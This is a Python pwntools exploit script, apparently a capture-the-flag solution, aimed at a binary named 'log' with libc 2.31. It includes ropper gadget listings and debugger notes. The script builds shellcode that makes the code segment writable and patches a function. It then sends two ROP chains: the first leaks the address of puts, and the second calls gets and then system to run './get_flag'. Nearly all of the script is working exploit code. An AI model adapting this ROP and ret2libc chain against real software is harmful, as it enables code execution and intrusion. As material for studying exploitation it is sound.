#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *
import sys

config = {
    "elf" : "./log",
    "libc" : "./libc-2.31.so",
    "HOST" : "0",
    "PORT" : 31338
}

"""
$ ropper --file ./log --search "pop"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: ./log
0x000000000040142c: pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040142e: pop r13; pop r14; pop r15; ret; 
0x0000000000401430: pop r14; pop r15; ret; 
0x0000000000401432: pop r15; ret; 
0x000000000040142b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040142f: pop rbp; pop r14; pop r15; ret; 
0x000000000040121d: pop rbp; ret; 
0x0000000000401433: pop rdi; ret; 
0x0000000000401431: pop rsi; pop r15; ret; 
0x000000000040142d: pop rsp; pop r13; pop r14; pop r15; ret; 
"""

def exploit():
    context.arch = "amd64"
    rdi = lambda x : p64(0x0000000000401433)+p64(x)

    x = shellcraft.amd64.linux
    y = shellcraft.amd64
    sc = ""
    """
        gef➤  print log_winner
        $1 = {<text variable, no debug info>} 0x401ac6 <log_winner>
    """
    """
        gef➤  x/20i 0x0000000000401b8d
        0x401b8d <log_winner+199>:   mov    rsi,rcx
        0x401b90 <log_winner+202>:   mov    edi,eax
        0x401b92 <log_winner+204>:   call   0x4012f0 <write@plt>
        0x401b97 <log_winner+209>:   mov    eax,DWORD PTR [rbp-0x2c]
        0x401b9a <log_winner+212>:   mov    edi,eax
    """
    """
        gef➤  x/bx 0x401b92
        0x401b92 <log_winner+204>:      0xe8
    """

    sc += x.mprotect(0x401000, 0x1000, 7)
    sc += y.mov('rax', 0x401b92)
    sc += """
        mov word ptr [rax], 0xc3c9
          """
    sc += y.mov('rax', 0x401ac6)
    sc += """
        and rsp, -0x10
        call rax
        xor rbx, rbx
        mov ebx, eax
         """
    rop = "IDIOT".ljust(8, '\x00')
    rop+= "A"*277
    rop+= rdi(e.got["puts"])
    rop+= p64(e.symbols["puts"])
    rop+= p64(e.symbols["main"])
    rop+= '\n'

    sc += y.pushstr(rop)
    sc += x.write('rbx', 'rsp', len(rop))
    sc += y.push(0)
    sc += x.read('rbx', 'rsp', 6)
    sc += y.mov('r9', libc.symbols["puts"])
    sc += y.mov('r10', libc.symbols["system"])
    sc += y.mov('r11', libc.symbols["exit"])
    sc += """
        pop r8
        sub r8, r9
        add r10, r8
        add r11, r8
          """

    system = 0 + libc.symbols["system"]
    exit = 0 + libc.symbols["exit"]
    rop = "IDIOT".ljust(8, '\x00')
    rop+= "A"*277
    rop+= rdi(0x0000000000404800)
    rop+= p64(e.symbols["gets"])
    rop+= rdi(0x0000000000404800)
    rop+= p64(system)
    rop+= p64(exit)
    sc += y.pushstr(rop)
    sc += """
        mov rax, rsp
        add rax, 325
        mov qword ptr [rax], r10
        add rax, 8
        mov qword ptr [rax], r11
          """

    sc += x.write('rbx', 'rsp', len(rop))
    sc += x.read('rbx', 'rsp', 5)
    sc += y.pushstr("./get_flag\n")
    sc += x.write('rbx', 'rsp', len("./get_flag\n"))
    sc += x.write('rbx', 'rsp', len("./get_flag\n"))
    sc += x.write('rbx', 'rsp', len("./get_flag\n"))
    sc += x.write('rbx', 'rsp', len("./get_flag\n"))
    sc += x.write('rbx', 'rsp', len("./get_flag\n"))
    sc += x.write('rbx', 'rsp', len("./get_flag\n"))
    sc += x.write('rbx', 'rsp', len("./get_flag\n"))
    sc += x.write('rbx', 'rsp', len("./get_flag\n"))
    sc += x.write('rbx', 'rsp', len("./get_flag\n"))
    sc += x.write('rbx', 'rsp', len("./get_flag\n"))
    sc += x.write('rbx', 'rsp', len("./get_flag\n"))
    sc += x.write('rbx', 'rsp', len("./get_flag\n"))
    sc += x.write('rbx', 'rsp', len("./get_flag\n"))
    sc += x.read('rbx', 'rsp', 100)
    sc += x.write(1, 'rsp', 100)

    print(sc)
    print(asm(sc).encode("hex"))
    return

if __name__ == "__main__":
    if "elf" in config.keys() and config["elf"]:
        e = ELF(config["elf"])
    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    exploit()
